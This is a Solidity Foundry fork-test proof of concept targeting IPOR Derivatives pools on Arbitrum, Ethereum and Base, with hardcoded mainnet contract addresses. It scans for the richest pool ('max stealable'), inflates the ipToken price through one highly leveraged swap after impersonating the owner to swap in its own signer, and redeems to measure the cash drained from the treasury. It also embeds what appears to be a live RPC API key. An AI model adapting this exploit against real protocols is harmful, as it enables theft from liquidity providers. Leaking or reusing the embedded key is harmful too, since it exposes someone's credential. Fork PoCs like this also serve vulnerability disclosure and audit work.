// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// ============================================================================
//  IPOR Derivatives — fork PoC: uncapped SOAP mark inflates the ipToken price
//  Chain: Arbitrum One (42161) by default, Ethereum (1) and Base (8453) also wired.
//
//  What it does
//    1. forks mainnet from the RPC embedded below
//    2. recon: prints the real cash of every attackable AMM pool on that chain
//    3. picks the pool with the most money
//    4. deals itself fake tokens, becomes ~50% of that pool, opens ONE leveraged
//       receive-fixed 90-day swap (self-harming, pool-profitable)
//    5. warps forward, redeems progressively, prints how much real money left
//       the treasury
//
//  Run
//    cd ~/arc_hedgefun
//    git submodule update --init --recursive          # if lib/ is empty
//    cp IporFork.t.sol test/
//    forge test --match-contract IporFork -vv
//
//  Optional knobs (all 18-dec wei):
//    ATK_LP=...  TOTAL=...  LEV=...  DAYS=...
//  e.g.  LEV=1000e18 DAYS=45 forge test --match-contract IporFork -vv
// ============================================================================

import {Test, console2} from "forge-std/Test.sol";

// ----------------------------------------------------------------- structs
struct RiskInputs {
    uint256 maxCollateralRatio;
    uint256 maxCollateralRatioPerLeg;
    uint256 maxLeveragePerLeg;
    int256 baseSpreadPerLeg;
    uint256 fixedRateCapPerLeg;
    uint256 demandSpreadFactor;
    uint256 expiration;
    bytes signature;
}

struct AmmBalances {
    uint256 totalCollateralPayFixed;
    uint256 totalCollateralReceiveFixed;
    uint256 liquidityPool;
    uint256 vault;
}

struct Swap {
    uint256 id;
    address buyer;
    uint256 openTimestamp;
    uint8 tenor;
    uint256 idsIndex;
    uint256 collateral;
    uint256 notional;
    uint256 ibtQuantity;
    uint256 fixedInterestRate;
    uint256 liquidationDepositAmount;
    uint8 state;
}

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

/// @dev the router dispatches by msg.sig, so one interface per product is enough
interface IRouter {
    function owner() external view returns (address);
    function setMessageSigner(address) external;

    // liquidity — stables
    function provideLiquidityUsdc(address beneficiary, uint256 amount) external;
    function provideLiquidityUsdt(address beneficiary, uint256 amount) external;
    function provideLiquidityDai(address beneficiary, uint256 amount) external;
    function redeemFromAmmPoolUsdc(address beneficiary, uint256 ipAmount) external;
    function redeemFromAmmPoolUsdt(address beneficiary, uint256 ipAmount) external;
    function redeemFromAmmPoolDai(address beneficiary, uint256 ipAmount) external;

    // liquidity — wstETH
    function provideLiquidityWstEth(address beneficiary, uint256 amount) external;
    function redeemFromAmmPoolWstEth(address beneficiary, uint256 ipAmount) external;

    // swaps
    function openSwapReceiveFixed90daysUsdc(
        address beneficiary, uint256 totalAmount, uint256 acceptableRate, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysUsdt(
        address beneficiary, uint256 totalAmount, uint256 acceptableRate, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysDai(
        address beneficiary, uint256 totalAmount, uint256 acceptableRate, uint256 leverage, RiskInputs calldata ri
    ) external returns (uint256);
    function openSwapReceiveFixed90daysWstEth(
        address beneficiary, address inputAsset, uint256 totalAmount, uint256 acceptableRate, uint256 leverage,
        RiskInputs calldata ri
    ) external returns (uint256);

    function getIpTokenExchangeRate(address asset) external view returns (uint256);
}

interface ILens {
    function getAmmBalance(address asset) external view returns (AmmBalances memory);
}

interface IStorage {
    function getSwap(uint8 direction, uint256 swapId) external view returns (Swap memory);
}

contract IporForkTest is Test {
    string constant RPC = "https://arb-mainnet.g.alchemy.com/v2/WqhCk5T_nDcejq-szWp1M";

    uint256 constant PRICE_ETH = 2800e18; // only used to rank pools in USD

    uint8 constant K_STABLE = 0;
    uint8 constant K_WSTETH = 1;

    struct Pool {
        string name;
        address asset;
        address ipToken;
        address treasury;
        address storageAddr;
        uint8 kind;
        uint8 decimals;
    }

    IRouter router;
    ILens lens;
    uint256 signerPk = 0xA11CE;
    address signer;
    address attacker = address(0xA77ACC);

    function setUp() public {
        string memory rpc = RPC;
        try vm.envString("ARB_RPC") returns (string memory r) {
            rpc = r;
        } catch {}
        vm.createSelectFork(rpc);
        signer = vm.addr(signerPk);
    }

    // ------------------------------------------------------------------ pools
    function _pools() internal returns (Pool[] memory p) {
        if (block.chainid == 42161) {
            p = new Pool[](2);
            router = IRouter(0x760Fa0aB719c4067D3A8d4727Cf07E8f3Bf118db);
            lens = ILens(0xd903D63Fb57a055a280D6DbAe91B261592B82dd3);
            p[0] = Pool("USDC  / Arbitrum", 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, 0x485cAC13E6492CcF4d47764b0E4e07b5272B0167,
                0x9324d39B29c85440cadd2202E4703E6f5d1e98F9, 0x52395372f2355491bC823d752bdb347807864308, K_STABLE, 6);
            p[1] = Pool("wstETH/ Arbitrum", 0x5979D7b546E38E414F7E9822514be443A4800529, 0xbDa4b3e17a9B0ecb811E68c6f08907156CBa503C,
                0xBd013Ea2E01C2Ab3462dd67e9C83aa3834882A5D, 0x326804339eC2a210e5f9246F4959aE50961c5C28, K_WSTETH, 18);
        } else if (block.chainid == 1) {
            p = new Pool[](3);
            router = IRouter(0x16d104009964e694761C0bf09d7Be49B7E3C26fd);
            lens = ILens(0x1F44C5ADA019CbB0729e277775877cCdb940E04a);
            p[0] = Pool("USDC  / Ethereum", 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x7c0e72f431FD69560D951e4C04A4de3657621a88,
                0x137000352B4ed784e8fa8815d225c713AB2e7Dc9, address(0), K_STABLE, 6);
            p[1] = Pool("USDT  / Ethereum", 0xdAC17F958D2ee523a2206206994597C13D831ec7, 0x9Bd2177027edEE300DC9F1fb88F24DB6e5e1edC6,
                0x28BC58e600eF718B9E97d294098abecb8c96b687, address(0), K_STABLE, 6);
            p[2] = Pool("DAI   / Ethereum", 0x6B175474E89094C44Da98b954EedeAC495271d0F, 0x8537b194BFf354c4738E9F3C81d67E3371DaDAf8,
                0xEd7d74AA7eB1f12F83dA36DFaC1de2257b4e7523, address(0), K_STABLE, 18);
        } else if (block.chainid == 8453) {
            p = new Pool[](2);
            router = IRouter(0x21d337eBF86E584e614ecC18A2B1144D3C375918);
            lens = ILens(0xa4989A9225f6DD130e8Ce4a4b5ef7902c8c389dc);
            p[0] = Pool("USDC  / Base", 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913, 0x4AEE7072AC1a49A3F84D0A95e32F3B7D1C97fB30,
                0x1AbA7a3C3bec8139B10a4807087084064A454a24, address(0), K_STABLE, 6);
            p[1] = Pool("wstETH/ Base", 0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452, 0xff7907CDCA84DB03f09702A4A49C262908AF48Af,
                0x09388e18d5C331449C6eF636726dD1fd007b8DDf, address(0), K_WSTETH, 18);
        } else {
            revert("unsupported chain: fork Arbitrum (42161), Ethereum (1) or Base (8453)");
        }
    }

    // ------------------------------------------------------------------ utils
    function _wad(uint256 a, uint8 d) internal pure returns (uint256) {
        return d == 18 ? a : a * 10 ** (18 - d);
    }

    function _usd(address asset, uint256 wad) internal view returns (uint256) {
        uint256 w = wad;
        if (asset == 0x5979D7b546E38E414F7E9822514be443A4800529 || asset == 0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452) {
            return (w * PRICE_ETH) / 1e18;
        }
        return w;
    }

    /// @dev all three values are 18-dec wad (the lens reports wad, the raw balance is scaled)
    function _cash(Pool memory p) internal view returns (uint256 idle, uint256 vault, uint256 total) {
        idle = _wad(IERC20Like(p.asset).balanceOf(p.treasury), p.decimals);
        vault = lens.getAmmBalance(p.asset).vault;
        total = idle + vault;
    }

    function _redeemSel(Pool memory p) internal pure returns (bytes4) {
        if (p.kind == K_WSTETH) return IRouter.redeemFromAmmPoolWstEth.selector;
        if (p.asset == 0xdAC17F958D2ee523a2206206994597C13D831ec7) return IRouter.redeemFromAmmPoolUsdt.selector;
        if (p.asset == 0x6B175474E89094C44Da98b954EedeAC495271d0F) return IRouter.redeemFromAmmPoolDai.selector;
        return IRouter.redeemFromAmmPoolUsdc.selector;
    }

    function _sign(RiskInputs memory r, address asset, uint256 tenor, uint256 dir) internal view returns (bytes memory) {
        bytes32 digest = keccak256(
            abi.encodePacked(
                r.maxCollateralRatio, r.maxCollateralRatioPerLeg, r.maxLeveragePerLeg, r.baseSpreadPerLeg,
                r.fixedRateCapPerLeg, r.demandSpreadFactor, r.expiration, asset, tenor, dir
            )
        );
        (uint8 v, bytes32 rr, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(rr, s, v);
    }

    function _env(string memory k, uint256 def) internal view returns (uint256) {
        try vm.envUint(k) returns (uint256 v) { return v; } catch { return def; }
    }

    // ------------------------------------------------------------------ 1. recon
    function test_0_recon() public {
        Pool[] memory ps = _pools();
        console2.log("chainid", block.chainid);
        console2.log("router owner (controls pause/emergencyClose):", router.owner());
        console2.log("");
        console2.log("pool                 idle cash        vault       total      USD");
        uint256 best;
        uint256 bestUsd;
        for (uint256 i; i < ps.length; i++) {
            (uint256 idle, uint256 vault, uint256 total) = _cash(ps[i]);
            uint256 usd = _usd(ps[i].asset, total);
            console2.log(ps[i].name);
            console2.log("   idle (wad) ", idle);
            console2.log("   vault(wad) ", vault);
            console2.log("   USD        ", usd);
            if (usd > bestUsd) { bestUsd = usd; best = i; }
        }
        console2.log("");
        console2.log("richest pool:", ps[best].name);
        console2.log("max stealable (USD)", bestUsd);
        console2.log("ipToken exchange rate", router.getIpTokenExchangeRate(ps[best].asset));
    }

    // ------------------------------------------------------------------ 2. attack
    function test_1_attack() public {
        Pool[] memory ps = _pools();

        // pick the richest attackable pool
        uint256 idx;
        uint256 bestUsd;
        for (uint256 i; i < ps.length; i++) {
            (,, uint256 total) = _cash(ps[i]);
            uint256 usd = _usd(ps[i].asset, total);
            if (usd > bestUsd) { bestUsd = usd; idx = i; }
        }
        Pool memory p = ps[idx];
        console2.log("target pool:", p.name);

        uint256 rate0 = router.getIpTokenExchangeRate(p.asset);
        AmmBalances memory b0 = lens.getAmmBalance(p.asset);
        console2.log("exchangeRate before", rate0);
        console2.log("liquidityPool      ", b0.liquidityPool);
        console2.log("treasury cash (raw)", IERC20Like(p.asset).balanceOf(p.treasury));

        // sizing: LP = existing depth, collateral+fee = 7.4% of it, 1000x
        uint256 depthWad = b0.liquidityPool != 0
            ? b0.liquidityPool
            : _wad(IERC20Like(p.asset).balanceOf(p.treasury), p.decimals);
        uint256 atkLpWad = _env("ATK_LP", depthWad);
        uint256 totalWad = _env("TOTAL", (depthWad * 74) / 1000);
        uint256 lev = _env("LEV", 1000e18);
        uint256 days_ = _env("DAYS", 45);

        uint256 unit = 10 ** p.decimals;
        uint256 atkLp = atkLpWad / 10 ** (18 - p.decimals);
        uint256 total = totalWad / 10 ** (18 - p.decimals);

        // 1) signature problem: the risk indicators must be signed by IPOR's off-chain key.
        //    A fork cannot forge that key, so (as the owner) we point the verifier at a key we hold.
        address owner = router.owner();
        vm.prank(owner);
        try router.setMessageSigner(signer) {} catch {
            console2.log("!! setMessageSigner failed - cannot sign risk indicators on this fork");
            console2.log("!! rerun with a captured signature instead; every number below would be fake");
            revert("blocked: no risk-indicator signer");
        }

        // 2) fake money + LP position
        deal(p.asset, attacker, atkLp + total + unit);
        vm.startPrank(attacker);
        IERC20Like(p.asset).approve(address(router), type(uint256).max);
        if (p.kind == K_WSTETH) router.provideLiquidityWstEth(attacker, atkLp);
        else if (p.asset == 0xaf88d065e77c8cC2239327C5EDb3A432268e5831 || p.asset == 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
            || p.asset == 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913) router.provideLiquidityUsdc(attacker, atkLp);
        else if (p.asset == 0xdAC17F958D2ee523a2206206994597C13D831ec7) router.provideLiquidityUsdt(attacker, atkLp);
        else router.provideLiquidityDai(attacker, atkLp);

        // 3) one leveraged receive-fixed 90-day swap
        RiskInputs memory ri = RiskInputs({
            maxCollateralRatio: 0.90e18,
            maxCollateralRatioPerLeg: 0.48e18,
            maxLeveragePerLeg: lev,
            baseSpreadPerLeg: 0.001e18,
            fixedRateCapPerLeg: 0.02e18,
            demandSpreadFactor: 280,
            expiration: block.timestamp + 1 hours,
            signature: ""
        });
        ri.signature = _sign(ri, p.asset, 2, 1); // tenor DAYS_90, direction PAY_FLOATING_RECEIVE_FIXED
        if (p.kind == K_WSTETH) {
            router.openSwapReceiveFixed90daysWstEth(attacker, p.asset, total, 0, lev, ri);
        } else if (p.asset == 0xaf88d065e77c8cC2239327C5EDb3A432268e5831 || p.asset == 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
            || p.asset == 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913) router.openSwapReceiveFixed90daysUsdc(attacker, total, 0, lev, ri);
        else if (p.asset == 0xdAC17F958D2ee523a2206206994597C13D831ec7) router.openSwapReceiveFixed90daysUsdt(attacker, total, 0, lev, ri);
        else router.openSwapReceiveFixed90daysDai(attacker, total, 0, lev, ri);
        vm.stopPrank();

        if (p.storageAddr != address(0)) {
            Swap memory s = IStorage(p.storageAddr).getSwap(1, 1);
            console2.log("== opened ==");
            console2.log("collateral", s.collateral);
            console2.log("notional  ", s.notional);
            console2.log("notional/real cash x1000", (s.notional * 1000) / (bestUsd == 0 ? 1 : bestUsd));
            console2.log("fixed rate", s.fixedInterestRate);
        }

        // 4) time passes, nobody intervenes
        vm.warp(block.timestamp + days_ * 1 days);
        vm.roll(block.number + days_ * 7200);

        uint256 rate1 = router.getIpTokenExchangeRate(p.asset);
        console2.log("== after warp ==");
        console2.log("days", days_);
        console2.log("exchangeRate after", rate1);
        console2.log("rate move, bps", ((rate1 * 10_000) / rate0) - 10_000);
        console2.log("treasury cash before redeem", IERC20Like(p.asset).balanceOf(p.treasury));

        // 5) redeem, largest feasible chunk first, then what is left
        uint256 cashBefore = IERC20Like(p.asset).balanceOf(p.treasury);
        uint256 balBefore = IERC20Like(p.asset).balanceOf(attacker);
        uint256 left = IERC20Like(p.ipToken).balanceOf(attacker);
        uint256[7] memory pct = [uint256(100), 75, 50, 25, 10, 5, 1];
        for (uint256 round; round < 8 && left > 0; round++) {
            bool moved;
            for (uint256 i; i < 7; i++) {
                uint256 chunk = (left * pct[i]) / 100;
                if (chunk == 0) continue;
                vm.prank(attacker);
                (bool ok,) = address(router).call(
                    abi.encodeWithSelector(
                        _redeemSel(p), attacker, chunk
                    )
                );
                if (ok) { left -= chunk; moved = true; break; }
            }
            if (!moved) break;
        }
        uint256 out = IERC20Like(p.asset).balanceOf(attacker) - balBefore;

        uint256 cashAfter = IERC20Like(p.asset).balanceOf(p.treasury);
        console2.log("== result ==");
        console2.log("attacker put in (LP + collateral)", atkLpWad + totalWad);
        console2.log("attacker got back  (wad)        ", out * 10 ** (18 - p.decimals));
        console2.log("ipToken left unredeemed         ", left);
        console2.log("real cash taken from treasury   ", _wad(cashBefore - cashAfter, p.decimals));
        console2.log("real cash left in treasury      ", _wad(cashAfter, p.decimals));
        if (out * 10 ** (18 - p.decimals) >= atkLpWad + totalWad) {
            console2.log("NET PROFIT (wad)", (out * 10 ** (18 - p.decimals)) - atkLpWad - totalWad);
        } else {
            console2.log("NET LOSS   (wad)", atkLpWad + totalWad - (out * 10 ** (18 - p.decimals)));
        }
    }
}
